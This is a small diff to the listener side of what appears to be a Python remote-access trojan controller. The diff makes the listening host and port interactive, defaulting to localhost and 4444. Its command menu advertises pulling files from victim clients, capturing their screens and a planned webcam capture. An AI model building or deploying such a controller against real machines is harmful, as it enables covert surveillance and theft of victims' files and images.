@@ -23,7 +23,7 @@ COMMANDS = {'\u001b[33m\u001b[1m\nhelp   ': ['Shows this help'],
 
             'get    ': ['NEW!!! Downloading files from the client'],
             'screenshot': ['NEW!!! SCREENSHOT THE CLIENT SCREEN'],
-            'webcam ': ['FUTURE!!! CAPTURE A PICTURE OF WEBCAM!\u001b[0m\n'],
+            'webcam ': ['FUTURE!!! CAPTURE A PICTURE OF WEBCAM!\u001b[0m\n\n'],
             }
 
 class MultiServer(object):
@@ -37,17 +37,21 @@ class MultiServer(object):
         print(" | |__| | |____ / ____ \| |  | |/ ____ \     | | | |____| |")
         print('  \_____|______/_/    \_\_|  |_/_/    \_\    |_|  \_____|_|     \u001b[0m\n')
 
-        self.host = ''
-        self.port = 8889
+        self.host = input("\u001b[33mSet the LHOST (empty for localhost): \u001b[0m")
+        if self.host == '':
+            self.host = 'localhost'
+        self.port = input("\u001b[31mSet the LPORT (empty for 4444): \u001b[0m")
+        try:
+            value = int(self.port)
+        except ValueError:
+            self.port = 4444
         self.socket = None
         self.all_connections = []
         self.all_addresses = []
 
-        print("\u001b[31m\u001b[1mType 'help' to see the list of commands\u001b[0m")
-
-        print("\u001b[33mThe port to use for the client is \u001b[1m" + str(self.port) + "\n\u001b[0m")
-
+        print("\nThe ip to use for client is \u001b[31m'%s'\u001b[0m. The port is:\u001b[31m %s\u001b[0m" % (self.host,self.port))
         print("\u001b[36m\u001b[1mTo connect to the first client, type \u001b[0m\u001b[36m'exploit 0'\u001b[0m \n")
+        print("\n\u001b[31m\u001b[1mType 'help' to see the list of commands\u001b[0m")
 
     def print_help(self):
         for cmd, v in COMMANDS.items():
